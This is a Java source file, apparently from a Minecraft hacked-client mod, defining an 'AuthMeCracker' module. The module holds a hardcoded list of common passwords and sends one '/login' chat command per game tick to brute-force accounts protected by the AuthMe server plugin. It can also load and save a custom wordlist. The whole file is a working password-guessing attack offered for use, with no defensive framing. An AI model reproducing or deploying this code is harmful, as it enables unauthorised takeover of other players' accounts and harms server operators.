package de.chrissx.mods.chat;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import de.chrissx.mods.Bindable;
import de.chrissx.mods.Mod;
import de.chrissx.util.Consts;
import de.chrissx.util.Util;

public class AuthMeCrack extends Mod {

	public static final String DEFAULT_AUTHME = 
			"password\r\n" + "passwort\r\n" + "password1\r\n" + "passwort1\r\n" + "password123\r\n" + "passwort123\r\n" + "pass\r\n" + "pw\r\n" + "pw1\r\n" + 
			"pw123\r\n" + "123\r\n" + "1234\r\n" + "12345\r\n" + "123456\r\n" + "1234567\r\n" + "12345678\r\n" + "123456789\r\n" + "login\r\n" + "register\r\n" + "test\r\n" + 
			"sicher\r\n" + "safe\r\n" + "me\r\n" + "ich\r\n" + "penis\r\n" + "penis1\r\n" + "penis12\r\n" + "penis123\r\n" + "minecraft\r\n" + "minecraft1\r\n" + "minecraft12\r\n" + 
			"minecraft123\r\n" + "mc\r\n" + "admin\r\n" + "server\r\n" + "yourmom\r\n" + "tester\r\n" + "account\r\n" + "creeper\r\n" + "gronkh\r\n" + "lol\r\n" + "lel\r\n" + 
			"kek\r\n" + "auth\r\n" + "authme\r\n" + "qwerty\r\n" + "qwertz\r\n" + "ficken\r\n" + "ficken1\r\n" + "ficken12\r\n" + "ficken123\r\n" + "fuck\r\n" + "fuckme\r\n" + "fuckyou";
	
	List<String> pws;
	
	File pwFile = Paths.get(Consts.configPath, "authmecracker.cfg").toFile();
	
	int times = 0;
	
	public AuthMeCrack() {
		super("AuthMeCracker");
		if(pwFile.exists()) {
			try {
				List<String> pwsL = new ArrayList<String>();
				BufferedReader reader;
				reader = new BufferedReader(new FileReader(pwFile));
				String s = "";
				while((s = reader.readLine()) != "" && s != null) {
					pwsL.add(s);
				}
				reader.close();
				pws = pwsL;
			} catch (Exception e) {
				e.printStackTrace();
			}
		}else {
			pws = Arrays.asList(DEFAULT_AUTHME.split("\r\n"));
		}
	}

	void tryCrack() {
		Util.sendChat("/login "+pws.get(times-1));
	}
	
	@Override
	public void onTick() {
		if(enabled && times != 0) {
			tryCrack();
			times--;
		}else {
			enabled = false;
			times = 0;
		}
	}
	
	@Override
	public void toggle() {
		enabled = true;
		times = pws.size();
	}
	
	@Override
	public void onStop() {
		try {
			if(!pwFile.exists())
				pwFile.createNewFile();
			if(pws.size() == 0)
				return;
			BufferedWriter writer = new BufferedWriter(new FileWriter(pwFile));
			writer.write(pws.get(0));
			for(int i = 1; i < pws.size(); i++) {
				writer.newLine();
				writer.write(pws.get(i));
			}
			writer.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void addPw(String pw) {
		pws.add(pw);
	}
}